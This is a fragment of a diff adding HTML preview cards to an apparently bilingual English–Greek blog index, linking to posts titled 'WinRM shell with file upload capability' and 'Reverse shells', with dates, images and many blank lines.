+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
